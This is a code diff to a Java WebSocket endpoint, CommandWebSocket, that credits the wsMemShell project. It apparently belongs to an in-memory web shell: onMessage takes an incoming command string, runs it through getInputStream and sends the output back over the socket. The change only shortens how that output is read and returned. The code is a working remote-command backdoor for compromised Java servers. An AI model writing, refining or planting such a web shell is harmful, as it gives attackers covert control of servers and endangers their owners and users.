@@ -6,6 +6,7 @@ import javax.websocket.MessageHandler;
 import javax.websocket.Session;
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
+import java.util.Scanner;
 
 /**
  * <a href="https://github.com/veo/wsMemShell">wsMemShell</a>
@@ -21,13 +22,7 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
     public void onMessage(String cmd) {
         try {
             InputStream inputStream = getInputStream(getParam(cmd));
-            byte[] buf = new byte[8192];
-            int length;
-            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-            while ((length = inputStream.read(buf)) != -1) {
-                outputStream.write(buf, 0, length);
-            }
-            session.getBasicRemote().sendText(outputStream.toString());
+            session.getBasicRemote().sendText(new Scanner(inputStream).useDelimiter("\\A").next());
         } catch (Throwable e) {
             e.printStackTrace();
         }
